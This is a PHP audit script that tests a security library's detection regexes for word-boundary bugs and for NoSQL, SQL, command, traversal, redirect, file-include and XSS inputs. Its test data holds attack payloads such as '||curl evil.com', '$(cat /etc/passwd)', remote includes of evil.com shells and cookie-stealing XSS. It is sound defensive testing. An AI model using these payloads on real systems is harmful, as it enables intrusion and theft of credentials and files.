<?php
/** 审计 Part 2: Word Boundary Bug + NoSQL 专项 */
if (!function_exists('env')) { function env($k,$d=null){return $d;} }
if (!function_exists('config_path')) { function config_path($p=''){return __DIR__.'/../config/'.$p;} }

require_once dirname(__DIR__).'/vendor/autoload.php';
use zxf\Security\Patterns\PatternService;
$ps = new PatternService();
$hr = $ps->getHighRiskPatterns();
$up = $ps->getUrlPathPatterns();

echo "═══ [1] Word Boundary (\b) Bug ── \b 在 .(dot) 之前失效 ═══\n";
echo "原理: \b 匹配 [a-zA-Z0-9_]↔非单词字符 的边界。\n";
echo "      . 是非单词字符，/ 也是非单词字符。\n";
echo "      所以 /path/.env 中 / 和 . 之间没有 word boundary！\n\n";

$bugPatterns = [
    'url_path L30' => ['/\b(\.env|\.git\/|\.git\/config)\b/i', '.git/config'],
    'url_path L31' => ['/\b(\.svn|\.hg|\.bzr)\b/i', '.svn'],
    'url_path L32' => ['/\b(\.htaccess|\.htpasswd|web\.config)\b/i', '.htaccess'],
    'url_path L35' => ['/\b(\.DS_Store|\.editorconfig|\.eslintrc|\.prettierrc)\b/i', '.DS_Store'],
    'hr path L88'  => ['/\b(\.env|\.git\/)\b/i', '.env'],
    'hr path L89'  => ['/\b(\.svn|\.hg|\.bzr)\b/i', '.svn'],
    'hr path L90'  => ['/\b(\.htaccess|\.htpasswd|web\.config)\b/i', '.htaccess'],
];

foreach ($bugPatterns as $label => [$pattern, $test]) {
    $matchInPath = @preg_match($pattern, "/path/$test");
    $matchAlone = @preg_match($pattern, "/$test");
    echo "  " . ($matchInPath||$matchAlone ? '✅' : '❌') . " $label | /path/$test: " . ($matchInPath?'MATCH':'MISS') . " | /$test: " . ($matchAlone?'MATCH':'MISS') . "\n";

    // Check: does removing \b fix it?
    if (!$matchInPath && !$matchAlone) {
        $fixed = preg_replace(['/\\\\b(?!\w)/','/(?<!\w)\\\\b/','/\b\\\\b\b/'], '', $pattern);
        $fixed = str_replace('\b', '', $fixed);
        $matchFixed = @preg_match($fixed, "/path/$test");
        echo "     → 去掉 \\b 后: " . ($matchFixed?'✅ MATCH':'❌ 仍不匹配') . "\n";
    }

    // Also test high_risk path pattern L87
    if ($label === 'hr path L88') {
        $test2 = "/etc/passwd";
        $p2 = '/\/(etc|proc|sys|var|home|root|usr\/local)\/(passwd|shadow|hosts|id_rsa|authorized_keys|\.env|\.git|\.htaccess|config\.php|database\.php)\b/i';
        echo "     → hr L87 /etc/passwd: " . (@preg_match($p2, $test2)?'✅':'❌') . "\n";
    }
}

echo "\n═══ [2] NoSQL 正则深度分析 ═══\n";
echo "NoSQL 正则:\n";
foreach ($hr['nosql']??[] as $i=>$p) echo "  #$i: $p\n";

// 关键：单引号防 PHP 变量插值
$nosqlTests = [
    ['{"$eq":"admin"}','$eq'],
    ['{"$ne":null}','$ne'],
    ['{"$where":"function(){}"}','$where'],
    ['{"$regex":"admin.*"}','$regex'],
    ['{"$exists":true}','$exists'],
    ['{"$or":[{}]}','$or'],
    ['{"$and":[{}]}','$and'],
    ['{"$in":["a"]}','$in'],
    ['{"$nin":["x"]}','$nin'],
    ['{"$type":"str"}','$type'],
    ['{"$mod":[4,0]}','$mod'],
    ['{"$size":3}','$size'],
    ['{"$all":["a"]}','$all'],
    ['{"$gte":18}','$gte'],
    ['{"$lt":18}','$lt'],
];

echo "\n预过滤+正则匹配测试:\n";
foreach ($nosqlTests as [$p,$name]) {
    $pf = $ps->preFilter('nosql', $p);
    $rx = false;
    foreach ($hr['nosql']??[] as $ptn) if (@preg_match($ptn, $p)) { $rx = true; break; }
    echo "  " . ($pf?'PF✅':'PF❌') . ' ' . ($rx?'RX✅':'RX❌') . " $name\n";
}

echo "\n═══ [3] SQL/Command 边界用例 ═══\n";
$edge = [
    'sql' => [
        ["union(distinct)select 1,2",'UNION DISTINCT'],
        ["union/**/select/**/1,2",'UNION block comment'],
        ["1' or '1'='1",'OR tautology'],
        ["1'/**/AND/**/1=1",'AND block comment'],
        ['\\', 'backslash escape'],
        ["0x61646d696e", 'hex literal'],
        ["admin'--",'comment bypass'],
    ],
    'command' => [
        [';id','semicolon+id'],
        ['|cat /etc/passwd','pipe+cat'],
        ['&&whoami','ampersand+whoami'],
        ['||curl evil.com','double pipe+curl'],
        ["\nwhoami",'newline+whoami'],
        ['$(cat /etc/passwd)','subshell cat'],
        ['`id`','backtick id'],
        ['|nslookup evil.com','pipe+nslookup'],
        ['%0Acat /etc/passwd','url newline+cat'],
    ],
    'path' => [
        ['../../../../etc/passwd','deep ../'],
        ['..\\..\\windows\\system32','win traversal'],
        ['%2e%2e%2fetc%2fpasswd','url ../'],
        ['....//....//etc/passwd','ellipsis bypass'],
        ['.%00/','null byte'],
        ['file=../../etc/passwd','param+traversal'],
    ],
];

foreach ($edge as $type => $cases) {
    echo "\n--- $type ---\n";
    foreach ($cases as [$p,$d]) {
        $rx = false;
        foreach ($hr[$type]??[] as $ptn) if (@preg_match($ptn, $p)) { $rx = true; break; }
        echo '  ' . ($rx?'✅':'❌') . " $d | $p\n";
    }
}

echo "\n═══ [4] Redirect/Encoding/FileInclude 边界 ═══\n";
$more = [
    'redirect' => [
        ['goto=//evil.com','protocol-relative'],
        ['next=javascript:alert(1)','js pseudo-protocol'],
        ["url=%2f%2fevil.com",'url-encoded //'],
        ["target=/evil.com/path",'single-slash redirect'],
    ],
    'encoding' => [
        ['%2525','double encoding'],
        ['&#x41;','html hex entity'],
        ['%u002e%u002e/','unicode %u buf'],
    ],
    'file_include' => [
        ['include(http://evil.com/shell.txt)','remote include'],
        ['require(php://filter/convert.base64-encode/resource=config.php)','php filter'],
        ['fopen(ftp://evil.com/backdoor)','ftp protocol'],
        ['include /etc/passwd','space no parens'],
    ],
];

foreach ($more as $type => $cases) {
    echo "\n--- $type ---\n";
    foreach ($cases as [$p,$d]) {
        $rx = false;
        foreach ($hr[$type]??[] as $ptn) if (@preg_match($ptn, $p)) { $rx = true; break; }
        echo '  ' . ($rx?'✅':'❌') . " $d\n";
        if (!$rx) echo "     payload: $p\n";
    }
}

echo "\n═══ [5] XSS DOM 边界 ═══\n";
$xss = $ps->getXssPatterns();
$domTests = [
    ['onload=alert(1)','onload handler'],
    ['onerror=alert(document.cookie)','onerror+cookie'],
    ['onclick=prompt(1)','onclick+prompt'],
    ['onfocus=eval("alert(1)")','onfocus+eval'],
    ['innerHTML="<img src=x onerror=alert(1)>"','innerHTML'],
];
foreach ($domTests as [$p,$d]) {
    $rx = false;
    foreach ($xss['dom']??[] as $ptn) if (@preg_match($ptn, $p)) { $rx = true; break; }
    echo '  ' . ($rx?'✅':'❌') . " $d\n";
}
echo "\n✅ Part 2 审计完成\n";
